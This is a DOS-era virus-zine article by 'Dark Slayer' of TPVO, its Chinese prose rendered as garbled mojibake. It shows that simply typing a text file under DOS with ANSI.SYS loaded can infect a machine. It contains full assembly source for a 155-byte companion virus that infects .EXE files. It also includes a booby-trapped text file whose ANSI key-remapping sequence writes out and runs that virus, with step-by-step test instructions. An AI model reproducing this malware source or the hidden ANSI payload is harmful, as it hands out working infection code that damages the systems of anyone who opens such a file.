
                                                                     P.005

         TpVOtPVoTpvOTpVOtpVoTPvOTPVOtpVOTPvOtPVOtPVOtPvOTPvOTpVoTPVO
         PT                                                        OT
         VP     ¥x ÆW «Â ¤O ¯f ¬r ²Õ Â´   ¯f¬rÂø»x   ²Ä ‘B ´Á      TP
         oV                                                        PV
         TO               Ææ  ¬Ý¤å¦rÀÉ·|¤¤¬r¶Ü¡S Ææ                Vo
         pT                                                        OT
         VP                    by  Dark Slayer                     VP
         OV                                                        OV
         OVTPVoTpvOtPvoTPVOtPvoTpVotpvoTpVotpvOtPvoTpVOtpvOTPvOTpvOTP


       ³Ìªñ 90 ºô¤W¦³¤H¦b°Q½×¬Ý¤å¦rÀÉ¬O§_·|¤¤¬r¡A¦³¤H»¡"·|"¡A¦]¬°¥L¨ºÃä
       ¦¬¶°ªºANSI¯f¬r¦³³oºØ¯à¤O¡A³o¨Ï§Ú·Q°_¥H«e°µªºÃö©óANSIªº¹êÅç¡A§Ú¼g
       ªº¤£¬O·|·P¬V¤å¦rÀÉªºANSI¯f¬r¡A¦Ó¥u¬O¬°¤FÃÒ©ú "¦bDOS ¤U type ¤@­Ó
       ¤å¦rÀÉ¤]¦³¥i¯à¤¤¬r" ¡A¦ý¦³¤@­Ó±ø¥ó¬O§A¥²¶·¥ý±¾¤WANSI.SYS¡C¨s³º¬O
       «ç»ò°µ¨ìªº©O¡S¨ä¹ê§Ú¥u¬O§Q¥ÎANSI©Ò´£¨Ñªº "©w¸q«öÁä" ªº¥\¯à¡A§â¬Y
       ­Ó«öÁä©w¸q¬°¤@¨ÇDOS ©R¥O¡A¦Ó³o¨ÇDOS ©R¥O´N¬O¥Î¨Ó»s³y©M±Ò°Ê¯f¬rªº
       ¡A¦p¦ó§Q¥ÎDOS ©R¥O¨Ó³y¥Xµ{¦¡©O¡S§Q¥Î¿é¥XÂà¦V echo µ{¦¡½X>x.com¡A
       ¦ý¬O·|¦³¤@­Ó°ÝÃD¡A´N¬O³o°¦¯f¬rªºµ{¦¡½X¥²¶·Á×¶}¤@¨Ç¯S®í±±¨î½X¡A¹³
       >¡B<·|³Q·í°µ¬O¿é¥X¡B¤JÂà¦V¡A¦Ó 1ah (ctrl-Z¡A^Z) ·|³Q·í°µ¬O¤å¦rÀÉ
       ªºµ²§ô½X(EOF) ... µ¥¡A°£¤F³o¨Ç¤§¥~ÁÙ¦³³\¦h±±¨î½X¬O¥²¶·Á×¶}ªº¡A©Ò
       ¥H¹ï©ó³o°¦¯f¬rªº¬Y¨Çµ{¦¡¼gªk¸û©_©Ç¡C ©³¤U´N¬O³o°¦¯f¬rªº source
       code¡A¥Î TASM ²ÕÄ¶«á¥i±o¨ì¤@­Ó155 Bytes ªº¯f¬r¡A³o°¦¬r¬OÄÝ©ó "¦ñ
       ÀH«¬" ¡A¥u¦ñÀH .EXE ÀÉ¡A«D±`¾n«¬... ¥Ñ©ó³o°¦¬r¨Ã¤£¬O¦¹½g¤å³¹ªº­«
       ÂI¡A¥B¥¦«ÜÂ²³æ¡A©Ò¥H§Ú´N¤£¥´µù¸Ñ¤F¡A¦Aºò±µµÛ¤U­±ªº¤å¦rÀÉ´N¬O§â¦¹
       ¬r¥[¤u«á¡A¥i§Q¥ÎANSI¨ÓÄ²µoªº¤å¦rÀÉ¡A§A¥i¥H§â¥¦Â^¨ú°µ¦¨³æ¿W¤@­ÓÀÉ
       ¡A¦ý¬O¦b DOS ¤Uª½±µ type ¦¹¤å³¹¤]¥i¥H¦³ "®ÄªG" ¡C

     ¹êÅç¤èªk¡R
        1> ­º¥ý½T©w§Aªº¹q¸£¦³±¾¤W ANSI.SYS¡T
        2> µM«á¨ì¬Y­Ó¦³ EXE ÀÉªº¥Ø¿ý¡Atype ¦¹¤å¦rÀÉ¡T
        3> ÀH«K¥´¤@­Ó DOS ©R¥O¡AEnter «á§A·|µo²{©_©Çªº²{¶H¡T
        4> ¥H dir/ah ¬ÝÁôÂÃÀÉ®×¡A§A´N·|µo²{¤@­Ó»P¬Y EXE ÀÉ¦W¬Û¦P¡A¦ý°ÆÀÉ
           ¦W¬° COM ªº¯f¬rÀÉ¡T

     µ²½×¡R
       §Ú¤£ª¾¹D§Úªº¤èªk¬O§_©M§O¤H©ÒÁ¿ªºANSI¯f¬r¤@¼Ë¡A¦ý¬O¥i¥H½T©w¤@ÂI¡A
       ³oºØ·P¬V¤èªk«Ü»¹¡A¦Ó¥B¦³³\¦h­­¨î¡A¹³¡R¥²¶·¦³±¾¤WANSI.SYS¡B¥²¶·¥Î
       DOS ªºtype¤~¯àÄ²µo¡A§Q¥Î¤@¨Ç¤å®Ñ³B²zµ{¦¡¨Ó¬Ý´NµLªkÄ²µo¦¹¬r¡B®e©ö
       ³Qµo²{... µ¥¯ÊÂI¡A¦ý§Ú­ÌÁÙ¬OÃÒ©ú¤F¤@¥ó¨Æ¡A¨º´N¬O -> ¬Ý¤å¦rÀÉÁÙ¬O
       ·|¤¤¬rªº¡A¤£¥ÎÃhºÃ :D

;================ Begin of vir.asm =====================================
vir_size        equ     (offset vir_end-offset start)
mem_size        equ     (offset mem_end-offset start+100h)
mem_para        equ     (mem_size+0fh)/10h

                .model  tiny
                .code
                org     100h
start:          jmp     vir_start

com_exe:        lodsb
                test    al,al
                jnz     com_exe
                xor     word ptr ds:[si-4],'OC' xor 'XE' xor 'D'
                xor     byte ptr ds:[si-4],'D'
                xor     byte ptr ds:[si-4+2],'M' xor 'E' xor 'S'
                xor     byte ptr ds:[si-4+2],'S'
                ret

vir_start:      mov     ah,1ah xor 'A'
                xor     ah,'A'
                mov     dx,offset vir_dta
                int     21h

                mov     ah,4eh
find_file:      mov     si,offset vir_dta[find_name]
                xor     cx,cx
                mov     ds:every_files[5+si]-vir_dta[find_name],cl
                mov     dx,offset every_files
                int     21h
                jc      exec_host

                mov     dx,si
                call    com_exe

                mov     ah,5bh
                mov     cl,4
                dec     cx
                int     21h
                xchg    bx,ax
                mov     ah,4fh
                jc      find_file

                mov     ah,40h
                mov     cl,vir_size
                xor     dl,dl
                int     21h

                mov     ah,0eh
                db      0dh,0ah,30h             ; or ax,300ah
                int     21h

exec_host:      mov     ah,4ah
                xor     si,si
                lea     bx,[si+mem_para+2]
                int     21h

                mov     di,offset pcb
                mov     bx,di
                xor     ax,ax
                cwd
                stosw
                mov     al,80h
                stosw
                mov     ax,es
                stosw
                lea     ax,[si+5ch]
                stosw
                mov     ax,es
                stosw
                lea     ax,[si+6ch]
                stosw
                mov     ax,es
                stosw

                mov     ds,ds:[si+2ch]
search_host_name:
                inc     si
                cmp     word ptr ds:[si],dx
                jne     search_host_name
                lodsw
                lodsw

                mov     dx,si
                call    com_exe

                mov     ah,4bh
                int     21h
                mov     ah,4dh
                int     21h
                mov     ah,4ch
                int     21h

every_files     db      '*.exe',0ffh
vir_end:
pcb             dw      7 dup(?)
mem_end:
vir_dta:

find            struc
find_drive      db      ?
find_find_name  db      8 dup(?)
find_find_ext   db      3 dup(?)
find_find_attr  db      ?
find_entry_count dw     ?
find_dir_1st_clust dw   ?
                db      4 dup(?)
find_attr       db      ?
find_time       dw      ?
find_date       dw      ?
find_size       dd      ?
find_name       db      13 dup(?)
find            ends
                end     start
;================= End of vir.asm ======================================

================ Begin of vir.txt ======================================
[13;13;"prompt $e[30m
echo ë¬„ÀuûtüB€tüD€tþ[€tþSÃ´[€ôAº©Í!´N¾Ç3ÉˆLÓº•Í!r ‹ÖèÉÿ´[±IÍ!“´Orà´@±›2ÒÍ!´>þ.com
echo 0Í!´J3ö\Í!¿›‹ß3À™«°€«ŒÀ«D\«ŒÀ«Dl«ŒÀ«Ž\,F9uû­­‹Öèyÿ´KÍ!´MÍ!´LÍ!*.exeÿ>>þ.com
þ
del þ.com
prompt $e[0m$p$g";13p
[1m[33mHi! This is a test of ANSI by [35mDark Slayer [33mof [37mTPVO[0m
================= End of vir.txt =======================================

